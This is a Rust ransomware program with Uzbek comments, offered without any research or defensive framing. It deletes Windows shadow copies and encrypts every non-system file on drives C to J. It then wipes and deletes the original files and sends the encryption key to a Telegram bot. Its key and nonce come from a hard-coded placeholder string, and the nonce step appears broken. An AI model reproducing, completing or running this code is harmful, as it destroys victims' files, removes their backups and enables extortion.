use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use dotenv::dotenv;
use reqwest::blocking::Client;
use serde_json::json;
use sha2::{Digest, Sha256}; // Kalitni hosil qilish uchun
use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;
use walkdir::WalkDir;
use aes_gcm::aead::generic_array::typenum::U12; // Nonce<U12> uchun

// Tizim fayllarini shifrlamaslik uchun filtr
const SYSTEM_PATHS: [&str; 3] = [
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
];

// Faylni shifrlash
fn encrypt_file(file_path: &Path, key: &Key<Aes256Gcm>, nonce: &Nonce<U12>) -> Result<(), Box<dyn std::error::Error>> {
    // Faylni o‘qish
    let mut file = File::open(file_path)?;
    let mut data = Vec::new();
    file.read_to_end(&mut data)?;

    // Shifrlash
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher.encrypt(nonce, data.as_ref()).map_err(|e| Box::<dyn std::error::Error>::from(e.to_string()))?;

    // Shifrlangan faylni saqlash
    let enc_path = file_path.with_extension("enc");
    let mut enc_file = File::create(&enc_path)?;
    enc_file.write_all(&ciphertext)?;

    // Asl faylni xavfsiz o‘chirish
    let mut file = OpenOptions::new().write(true).open(file_path)?;
    let len = file.metadata()?.len() as usize;
    let zeros = vec![0u8; len];
    for _ in 0..3 {
        file.write_all(&zeros)?;
        file.flush()?;
    }
    fs::remove_file(file_path)?;

    Ok(())
}

// Telegramga kalit yuborish
fn send_to_telegram(key_b64: &str, telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let url = format!("https://api.telegram.org/bot{}/sendMessage", telegram_token);
    let payload = json!({
        "chat_id": chat_id,
        "text": format!("Shifrlash kaliti: {}", key_b64)
    });
    client.post(&url).json(&payload).send()?;
    Ok(())
}

// Barcha drayvlarni shifrlash
fn encrypt_all_drives(telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Kalitni "YourKey" dan hosil qilish (32 bayt)
    let mut hasher = Sha256::new();
    hasher.update("YourKey");
    let key_bytes: [u8; 32] = hasher.finalize().into();
    let key: Key<Aes256Gcm> = key_bytes.into();

    // Nonce ni "YourKey" dan olish (12 bayt)
    let nonce_bytes: [u8; 12] = "YourKey"
        .as_bytes()
        .get(0..12)
        .ok_or("Nonce uchun yetarli bayt yo‘q")?
        .try_into()?;
    let nonce = Nonce::from_slice(&nonce_bytes);
    let key_b64 = general_purpose::STANDARD.encode(&key);

    // Windows drayvlarini aniqlash
    let drives = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J']
        .iter()
        .map(|&drive| format!("{}:\\", drive))
        .filter(|drive| Path::new(drive).exists());

    for drive in drives {
        for entry in WalkDir::new(&drive).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() && !SYSTEM_PATHS.iter().any(|sys_path| path.to_string_lossy().starts_with(sys_path)) {
                if let Err(e) = encrypt_file(path, &key, &nonce) {
                    eprintln!("Fayl shifrlashda xato {}: {}", path.display(), e);
                }
            }
        }
    }

    // Kalitni Telegramga yuborish
    send_to_telegram(&key_b64, telegram_token, chat_id)?;

    Ok(())
}

// Shadow copy o‘chirish
fn delete_shadow_copies() -> Result<(), Box<dyn std::error::Error>> {
    let output = Command::new("vssadmin")
        .args(["delete", "shadows", "/all", "/quiet"])
        .output()?;
    if !output.status.success() {
        eprintln!("Shadow copy o‘chirishda xato: {:?}", output.stderr);
    }
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // .env faylini yuklash
    dotenv().ok();

    // Telegram sozlamalari
    let telegram_token = env::var("TELEGRAM_TOKEN").expect("TELEGRAM_TOKEN .env faylida bo‘lishi kerak");
    let chat_id = env::var("CHAT_ID").expect("CHAT_ID .env faylida bo‘lishi kerak");

    // Shadow copy o‘chirish
    delete_shadow_copies()?;

    // Signal handler o‘rnatish
    ctrlc::set_handler(move || {
        if let Err(e) = encrypt_all_drives(&telegram_token, &chat_id) {
            eprintln!("Drayvlarni shifrlashda xato: {}", e);
        } else {
            println!("Fayllar shifrlanib, kalit Telegramga yuborildi!");
        }
    })
    .expect("Signal handler o‘rnatishda xato");

    // Signal kutilguncha ishlash
    loop {
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
}